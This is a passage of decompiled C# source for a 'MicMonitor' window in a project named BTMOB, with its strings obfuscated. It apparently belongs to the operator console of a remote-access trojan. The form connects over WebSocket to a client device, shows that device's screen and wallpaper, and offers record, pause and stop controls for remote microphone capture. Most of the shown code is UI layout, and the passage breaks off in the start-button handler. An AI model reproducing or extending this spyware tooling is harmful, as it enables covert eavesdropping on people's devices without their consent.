using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using BTMOB.My.Resources;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;
using Newtonsoft.Json.Linq;

namespace BTMOB;

[DesignerGenerated]
public class MicMonitor : basestyle
{
	[CompilerGenerated]
	internal sealed class _Closure_0024__65_002D0
	{
		public string _0024VB_0024Local_datastr;

		public MicMonitor _0024VB_0024Me;

		public _Closure_0024__65_002D0(_Closure_0024__65_002D0 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_datastr = arg0._0024VB_0024Local_datastr;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__0()
		{
			_0024VB_0024Me.websockclient.Connect(_0024VB_0024Local_datastr);
		}
	}

	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("comboqultz")]
	private DrakeUIComboBox _comboqultz;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("combosrces")]
	private DrakeUIComboBox _combosrces;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("statetimer")]
	private System.Windows.Forms.Timer _statetimer;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("startbtn")]
	private DrakeUIButtonIcon _startbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("stopbtn")]
	private DrakeUIButtonIcon _stopbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("continuebtn")]
	private DrakeUIButtonIcon _continuebtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("pausebtn")]
	private DrakeUIButtonIcon _pausebtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("recordbtn")]
	private DrakeUIButtonIcon _recordbtn;

	public BTClient Btcli;

	public bool isRecording;

	public List<byte[]> audioParts;

	public AudioVisualizer visualizer;

	private WebSocketClient websockclient;

	private string recotext;

	private string stoptext;

	[field: AccessedThroughProperty("progressbaradio")]
	internal virtual DrakeUITrackBar progressbaradio
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIComboBox comboqultz
	{
		[CompilerGenerated]
		get
		{
			return _comboqultz;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = comboqultz_SelectedIndexChanged;
			DrakeUIComboBox drakeUIComboBox = _comboqultz;
			if (drakeUIComboBox != null)
			{
				drakeUIComboBox.SelectedIndexChanged -= value2;
			}
			_comboqultz = value;
			drakeUIComboBox = _comboqultz;
			if (drakeUIComboBox != null)
			{
				drakeUIComboBox.SelectedIndexChanged += value2;
			}
		}
	}

	internal virtual DrakeUIComboBox combosrces
	{
		[CompilerGenerated]
		get
		{
			return _combosrces;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = combosrces_SelectedIndexChanged;
			DrakeUIComboBox drakeUIComboBox = _combosrces;
			if (drakeUIComboBox != null)
			{
				drakeUIComboBox.SelectedIndexChanged -= value2;
			}
			_combosrces = value;
			drakeUIComboBox = _combosrces;
			if (drakeUIComboBox != null)
			{
				drakeUIComboBox.SelectedIndexChanged += value2;
			}
		}
	}

	internal virtual System.Windows.Forms.Timer statetimer
	{
		[CompilerGenerated]
		get
		{
			return _statetimer;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = statetimer_Tick;
			System.Windows.Forms.Timer timer = _statetimer;
			if (timer != null)
			{
				timer.Tick -= value2;
			}
			_statetimer = value;
			timer = _statetimer;
			if (timer != null)
			{
				timer.Tick += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel3")]
	internal virtual Panel Panel3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W3")]
	internal virtual DrakeWidth_W DrakeWidth_W3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W2")]
	internal new virtual DrakeWidth_W DrakeWidth_W2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon startbtn
	{
		[CompilerGenerated]
		get
		{
			return _startbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = startbtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _startbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_startbtn = value;
			drakeUIButtonIcon = _startbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon stopbtn
	{
		[CompilerGenerated]
		get
		{
			return _stopbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = stopbtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _stopbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_stopbtn = value;
			drakeUIButtonIcon = _stopbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("mictoolbox")]
	internal virtual TableLayoutPanel mictoolbox
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon continuebtn
	{
		[CompilerGenerated]
		get
		{
			return _continuebtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon11_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _continuebtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_continuebtn = value;
			drakeUIButtonIcon = _continuebtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon pausebtn
	{
		[CompilerGenerated]
		get
		{
			return _pausebtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon10_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _pausebtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_pausebtn = value;
			drakeUIButtonIcon = _pausebtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon recordbtn
	{
		[CompilerGenerated]
		get
		{
			return _recordbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = recordbtn_Click_1;
			DrakeUIButtonIcon drakeUIButtonIcon = _recordbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_recordbtn = value;
			drakeUIButtonIcon = _recordbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	public MicMonitor()
	{
		base.Load += MicMonitor_Load;
		base.FormClosing += MicMonitor_FormClosing;
		isRecording = false;
		audioParts = new List<byte[]>();
		websockclient = null;
		recotext = EXGuarder._634D4319;
		stoptext = EXGuarder._502A6E74;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(BTMOB.MicMonitor));
		this.progressbaradio = new DrakeUI.Framework.DrakeUITrackBar();
		this.comboqultz = new DrakeUI.Framework.DrakeUIComboBox();
		this.combosrces = new DrakeUI.Framework.DrakeUIComboBox();
		this.statetimer = new System.Windows.Forms.Timer(this.components);
		this.Panel3 = new System.Windows.Forms.Panel();
		this.stopbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeWidth_W3 = new DrakeUI.Framework.DrakeWidth_W();
		this.startbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeWidth_W2 = new DrakeUI.Framework.DrakeWidth_W();
		this.mictoolbox = new System.Windows.Forms.TableLayoutPanel();
		this.continuebtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.pausebtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.recordbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		((System.ComponentModel.ISupportInitialize)this.myscr).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.myico).BeginInit();
		this.tobpanelsti.SuspendLayout();
		this.Panel3.SuspendLayout();
		this.mictoolbox.SuspendLayout();
		base.SuspendLayout();
		this.pinbtn.Location = new System.Drawing.Point(452, 5);
		this.minibtn.Location = new System.Drawing.Point(494, 5);
		this.closbtn.Location = new System.Drawing.Point(536, 5);
		this.mytitle.Location = new System.Drawing.Point(5, 4);
		this.mytitle.Size = new System.Drawing.Size(568, 18);
		this.tobpanelsti.Padding = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.tobpanelsti.Size = new System.Drawing.Size(578, 26);
		this.progressbaradio.BackColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.progressbaradio.DisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.progressbaradio.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.progressbaradio.Enabled = false;
		this.progressbaradio.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.progressbaradio.Font = new System.Drawing.Font(EXGuarder._1B191D3C, 12f);
		this.progressbaradio.ForeColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.progressbaradio.Location = new System.Drawing.Point(9, 47);
		this.progressbaradio.Name = EXGuarder._2F196F5E;
		this.progressbaradio.RectColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.progressbaradio.Size = new System.Drawing.Size(560, 14);
		this.progressbaradio.Style = DrakeUI.Framework.UIStyle.Custom;
		this.progressbaradio.TabIndex = 42;
		this.progressbaradio.Text = EXGuarder._0C120B21;
		this.comboqultz.Dock = System.Windows.Forms.DockStyle.Left;
		this.comboqultz.DropDownStyle = DrakeUI.Framework.UIDropDownStyle.DropDownList;
		this.comboqultz.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.comboqultz.Font = new System.Drawing.Font(EXGuarder._1B191D3C, 9f);
		this.comboqultz.ForeColor = System.Drawing.Color.FromArgb(224, 224, 224);
		this.comboqultz.Items.AddRange(new object[6]
		{
			EXGuarder._4A530C1F,
			EXGuarder._6F271E42,
			EXGuarder._59654A3B,
			EXGuarder._430A204E,
			EXGuarder._5021024F,
			EXGuarder._2D0A0111
		});
		this.comboqultz.Location = new System.Drawing.Point(167, 9);
		this.comboqultz.Margin = new System.Windows.Forms.Padding(4);
		this.comboqultz.MinimumSize = new System.Drawing.Size(56, 0);
		this.comboqultz.Name = EXGuarder._16182D1F;
		this.comboqultz.Padding = new System.Windows.Forms.Padding(0, 0, 30, 0);
		this.comboqultz.Radius = 15;
		this.comboqultz.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.comboqultz.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.comboqultz.Size = new System.Drawing.Size(148, 25);
		this.comboqultz.Style = DrakeUI.Framework.UIStyle.Custom;
		this.comboqultz.TabIndex = 43;
		this.comboqultz.Text = EXGuarder._791A1A28;
		this.comboqultz.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
		this.combosrces.Dock = System.Windows.Forms.DockStyle.Left;
		this.combosrces.DropDownStyle = DrakeUI.Framework.UIDropDownStyle.DropDownList;
		this.combosrces.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.combosrces.Font = new System.Drawing.Font(EXGuarder._1B191D3C, 9f);
		this.combosrces.ForeColor = System.Drawing.Color.FromArgb(224, 224, 224);
		this.combosrces.Items.AddRange(new object[5]
		{
			EXGuarder._3A2C0B5C,
			EXGuarder._75184D15,
			EXGuarder._3A74250C,
			EXGuarder._1D2F2C03,
			EXGuarder._313F2368
		});
		this.combosrces.Location = new System.Drawing.Point(9, 9);
		this.combosrces.Margin = new System.Windows.Forms.Padding(4);
		this.combosrces.MinimumSize = new System.Drawing.Size(56, 0);
		this.combosrces.Name = EXGuarder._60036D4D;
		this.combosrces.Padding = new System.Windows.Forms.Padding(0, 0, 30, 0);
		this.combosrces.Radius = 15;
		this.combosrces.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.combosrces.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.combosrces.Size = new System.Drawing.Size(148, 25);
		this.combosrces.Style = DrakeUI.Framework.UIStyle.Custom;
		this.combosrces.TabIndex = 50;
		this.combosrces.Text = EXGuarder._3A2C0B5C;
		this.combosrces.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
		this.Panel3.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Panel3.Controls.Add(this.stopbtn);
		this.Panel3.Controls.Add(this.DrakeWidth_W3);
		this.Panel3.Controls.Add(this.comboqultz);
		this.Panel3.Controls.Add(this.combosrces);
		this.Panel3.Controls.Add(this.startbtn);
		this.Panel3.Controls.Add(this.progressbaradio);
		this.Panel3.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Panel3.Location = new System.Drawing.Point(2, 64);
		this.Panel3.Name = EXGuarder._6879531E;
		this.Panel3.Padding = new System.Windows.Forms.Padding(9);
		this.Panel3.Size = new System.Drawing.Size(578, 70);
		this.Panel3.TabIndex = 51;
		this.Panel3.Controls.SetChildIndex(this.progressbaradio, 0);
		this.Panel3.Controls.SetChildIndex(this.startbtn, 0);
		this.Panel3.Controls.SetChildIndex(this.combosrces, 0);
		this.Panel3.Controls.SetChildIndex(this.comboqultz, 0);
		this.Panel3.Controls.SetChildIndex(this.DrakeWidth_W3, 0);
		this.Panel3.Controls.SetChildIndex(this.stopbtn, 0);
		this.stopbtn.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.stopbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.stopbtn.Dock = System.Windows.Forms.DockStyle.Right;
		this.stopbtn.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.stopbtn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.stopbtn.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.stopbtn.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.stopbtn.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.stopbtn.Font = new System.Drawing.Font(EXGuarder._1B191D3C, 9f);
		this.stopbtn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.stopbtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.stopbtn.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.stopbtn.Location = new System.Drawing.Point(452, 9);
		this.stopbtn.Name = EXGuarder._5A332D27;
		this.stopbtn.Radius = 15;
		this.stopbtn.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.stopbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.stopbtn.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.stopbtn.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.stopbtn.RectSelectedColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.stopbtn.Size = new System.Drawing.Size(54, 38);
		this.stopbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.stopbtn.Symbol = 61516;
		this.stopbtn.SymbolSize = 18;
		this.stopbtn.TabIndex = 54;
		this.DrakeWidth_W3.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W3.Dock = System.Windows.Forms.DockStyle.Right;
		this.DrakeWidth_W3.Location = new System.Drawing.Point(506, 9);
		this.DrakeWidth_W3.Name = EXGuarder._555F4809;
		this.DrakeWidth_W3.Size = new System.Drawing.Size(9, 38);
		this.DrakeWidth_W3.TabIndex = 52;
		this.startbtn.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.startbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.startbtn.Dock = System.Windows.Forms.DockStyle.Right;
		this.startbtn.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.startbtn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.startbtn.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.startbtn.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.startbtn.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.startbtn.Font = new System.Drawing.Font(EXGuarder._1B191D3C, 9f);
		this.startbtn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.startbtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.startbtn.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.startbtn.Location = new System.Drawing.Point(515, 9);
		this.startbtn.Name = EXGuarder._1F761A68;
		this.startbtn.Radius = 15;
		this.startbtn.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.startbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.startbtn.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.startbtn.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.startbtn.RectSelectedColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.startbtn.Size = new System.Drawing.Size(54, 38);
		this.startbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.startbtn.Symbol = 61515;
		this.startbtn.SymbolSize = 18;
		this.startbtn.TabIndex = 53;
		this.DrakeWidth_W2.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W2.Dock = System.Windows.Forms.DockStyle.Left;
		this.DrakeWidth_W2.Location = new System.Drawing.Point(157, 9);
		this.DrakeWidth_W2.Name = EXGuarder._5E414C31;
		this.DrakeWidth_W2.Size = new System.Drawing.Size(30, 38);
		this.DrakeWidth_W2.TabIndex = 51;
		this.mictoolbox.ColumnCount = 3;
		this.mictoolbox.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Percent, 33.33333f));
		this.mictoolbox.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Percent, 33.33333f));
		this.mictoolbox.ColumnStyles.Add(new System.Windows.Forms.ColumnStyle(System.Windows.Forms.SizeType.Percent, 33.33333f));
		this.mictoolbox.Controls.Add(this.continuebtn, 0, 0);
		this.mictoolbox.Controls.Add(this.pausebtn, 0, 0);
		this.mictoolbox.Controls.Add(this.recordbtn, 0, 0);
		this.mictoolbox.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.mictoolbox.Location = new System.Drawing.Point(2, 134);
		this.mictoolbox.Name = EXGuarder._6E746970;
		this.mictoolbox.Padding = new System.Windows.Forms.Padding(8, 7, 8, 7);
		this.mictoolbox.RowCount = 1;
		this.mictoolbox.RowStyles.Add(new System.Windows.Forms.RowStyle(System.Windows.Forms.SizeType.Percent, 100f));
		this.mictoolbox.Size = new System.Drawing.Size(578, 58);
		this.mictoolbox.TabIndex = 55;
		this.continuebtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.continuebtn.Dock = System.Windows.Forms.DockStyle.Fill;
		this.continuebtn.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.continuebtn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.continuebtn.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.continuebtn.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.continuebtn.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.continuebtn.Font = new System.Drawing.Font(EXGuarder._1B191D3C, 9f);
		this.continuebtn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.continuebtn.ForeDisableColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.continuebtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.continuebtn.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.continuebtn.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.continuebtn.Location = new System.Drawing.Point(387, 11);
		this.continuebtn.Margin = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.continuebtn.Name = EXGuarder._44334134;
		this.continuebtn.Radius = 15;
		this.continuebtn.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.continuebtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.continuebtn.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.continuebtn.RectPressColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.continuebtn.RectSelectedColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.continuebtn.Size = new System.Drawing.Size(178, 36);
		this.continuebtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.continuebtn.Symbol = 57422;
		this.continuebtn.TabIndex = 24;
		this.continuebtn.Text = EXGuarder._1619686E;
		this.pausebtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.pausebtn.Dock = System.Windows.Forms.DockStyle.Fill;
		this.pausebtn.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.pausebtn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.pausebtn.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.pausebtn.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.pausebtn.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.pausebtn.Font = new System.Drawing.Font(EXGuarder._1B191D3C, 9f);
		this.pausebtn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.pausebtn.ForeDisableColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.pausebtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.pausebtn.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.pausebtn.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.pausebtn.Location = new System.Drawing.Point(200, 11);
		this.pausebtn.Margin = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.pausebtn.Name = EXGuarder._09205F05;
		this.pausebtn.Padding = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.pausebtn.Radius = 15;
		this.pausebtn.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.pausebtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.pausebtn.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.pausebtn.RectPressColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.pausebtn.RectSelectedColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.pausebtn.Size = new System.Drawing.Size(177, 36);
		this.pausebtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.pausebtn.Symbol = 62091;
		this.pausebtn.TabIndex = 25;
		this.pausebtn.Text = EXGuarder._36784F06;
		this.recordbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.recordbtn.Dock = System.Windows.Forms.DockStyle.Fill;
		this.recordbtn.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.recordbtn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.recordbtn.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.recordbtn.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.recordbtn.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.recordbtn.Font = new System.Drawing.Font(EXGuarder._1B191D3C, 9f);
		this.recordbtn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.recordbtn.ForeDisableColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.recordbtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.recordbtn.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.recordbtn.ForeSelectedColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.recordbtn.Location = new System.Drawing.Point(13, 11);
		this.recordbtn.Margin = new System.Windows.Forms.Padding(5, 4, 5, 4);
		this.recordbtn.Name = EXGuarder._343D135A;
		this.recordbtn.Radius = 15;
		this.recordbtn.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.recordbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.recordbtn.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.recordbtn.RectPressColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.recordbtn.RectSelectedColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.recordbtn.Size = new System.Drawing.Size(177, 36);
		this.recordbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.recordbtn.Symbol = 61744;
		this.recordbtn.TabIndex = 23;
		this.recordbtn.Text = EXGuarder._0055374D;
		base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 18f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		base.ClientSize = new System.Drawing.Size(582, 194);
		base.Controls.Add(this.Panel3);
		base.Controls.Add(this.mictoolbox);
		base.Icon = (System.Drawing.Icon)resources.GetObject(EXGuarder._592F0A51);
		base.Name = EXGuarder._3E184D39;
		this.Text = EXGuarder._11471D28;
		base.Controls.SetChildIndex(this.tobpanelsti, 0);
		base.Controls.SetChildIndex(this.mictoolbox, 0);
		base.Controls.SetChildIndex(this.Panel3, 0);
		((System.ComponentModel.ISupportInitialize)this.myscr).EndInit();
		((System.ComponentModel.ISupportInitialize)this.myico).EndInit();
		this.tobpanelsti.ResumeLayout(false);
		this.Panel3.ResumeLayout(false);
		this.mictoolbox.ResumeLayout(false);
		base.ResumeLayout(false);
	}

	private void MicMonitor_Load(object sender, EventArgs e)
	{
		myico.Image = Btcli.wallpaper;
		myscr.Image = Btcli.screen;
		visualizer = new AudioVisualizer(progressbaradio);
		translateme();
		statetimer.Start();
	}

	private void translateme()
	{
		object value = BTRegistry.GetValue(EXGuarder._771D5D5C, EXGuarder._6C254F2D);
		if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._633D3322, TextCompare: false))
		{
			stoptext = EXGuarder._47631557;
			recotext = EXGuarder._2C301019;
			recordbtn.Text = recotext;
			pausebtn.Text = EXGuarder._49073F0A;
			continuebtn.Text = EXGuarder._4F6D570F;
			comboqultz.Text = EXGuarder._3513740E;
			combosrces.Text = EXGuarder._2A552B59;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._424E1777, TextCompare: false))
		{
			stoptext = EXGuarder._37041C44;
			recotext = EXGuarder._70414A00;
			recordbtn.Text = recotext;
			pausebtn.Text = EXGuarder._6D1C723A;
			continuebtn.Text = EXGuarder._57077004;
			comboqultz.Text = EXGuarder._78315A2F;
			combosrces.Text = EXGuarder._0F1A504D;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._70137255, TextCompare: false))
		{
			stoptext = EXGuarder._47285470;
			recotext = EXGuarder._03354E4C;
			recordbtn.Text = recotext;
			pausebtn.Text = EXGuarder._16427124;
			continuebtn.Text = EXGuarder._3B1A7372;
			comboqultz.Text = EXGuarder._1A68432B;
			combosrces.Text = EXGuarder._26605D11;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._21101B2A, TextCompare: false))
		{
			stoptext = EXGuarder._1E5D6205;
			recotext = EXGuarder._34704269;
			recordbtn.Text = recotext;
			pausebtn.Text = EXGuarder._04147941;
			continuebtn.Text = EXGuarder._4102006F;
			comboqultz.Text = EXGuarder._31524552;
			combosrces.Text = EXGuarder._59312636;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._4A6C691E, TextCompare: false))
		{
			stoptext = EXGuarder._344D2E35;
			recotext = EXGuarder._092C593F;
			recordbtn.Text = recotext;
			pausebtn.Text = EXGuarder._1758085C;
			continuebtn.Text = EXGuarder._3D5A614E;
			comboqultz.Text = EXGuarder._4E590316;
			combosrces.Text = EXGuarder._47356548;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._770C0638, TextCompare: false))
		{
			stoptext = EXGuarder._4B286957;
			recotext = EXGuarder._6D584F21;
			recordbtn.Text = recotext;
			pausebtn.Text = EXGuarder._1758085C;
			continuebtn.Text = EXGuarder._3D5A614E;
			comboqultz.Text = EXGuarder._38017429;
			combosrces.Text = EXGuarder._1366343E;
		}
	}

	private async void startbtn_Click(object sender, EventArgs e)
	{
		string value = comboqultz.Text switch
		{
			"8000 (Hz)" => "8000", 
			"11025 (Hz)" => "11025", 
